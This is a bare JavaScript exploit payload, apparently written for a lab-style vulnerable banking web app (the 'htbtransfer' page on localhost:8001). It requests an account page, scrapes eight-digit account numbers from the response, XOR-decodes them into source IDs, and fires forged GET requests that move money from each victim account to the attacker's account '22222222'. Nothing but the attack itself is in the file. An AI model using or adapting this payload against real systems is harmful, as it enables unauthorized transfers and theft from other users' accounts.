var xorValue = 195936478;
var targetID = 11111111;
var targetBankID = xorValue ^ targetID;
var ms = 200;
var xhttp = new XMLHttpRequest();
var myBankAccount = "22222222";
var shouldBeSent = 1;
xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200 && shouldBeSent) {
    var regex = /[0]{8}|[1]{8}|[2]{8}|[3]{8}|[4]{8}|[5]{8}|[6]{8}|[7]{8}|[8]{8}|[9]{8}/g,
      result, indices = [];
    while ((result = regex.exec(this.responseText))) {
      indices.push(result.index);
      account_numbers = [];
      for (var j = 0; j < indices.length; j++) {
        account_numbers.push("");
        for (var i = 0; i < 8; i++) {
          account_numbers[j] += this.responseText[indices[j] + i];
        }
      }
    }
    uniq_account_numbers = [...new Set(account_numbers)];
    uniq_account_numbers.splice(uniq_account_numbers.indexOf(myBankAccount), 1);
    console.log(uniq_account_numbers);
    for (var i = 0; i < uniq_account_numbers.length; i++) {
      var xoredBankID = uniq_account_numbers[i] ^ xorValue;
      xhttp.open("GET", "http://localhost:8001/index.php?page=htbtransfer&srcacc=" + xoredBankID + "&dstbank=41131337&dstacc=22222222&amount=1&remark=it is working&htbtransfer=Transfer", true);
      var start = new Date().getTime();
      var end = start;
      while (end < start + ms) {
        end = new Date().getTime();
      }
      xhttp.send();
    }
    shouldBeSent = 0;
  }
}
xhttp.open("GET", "http://localhost:8001/index.php?page=htbdetails&account=" + targetBankID, true);
xhttp.send();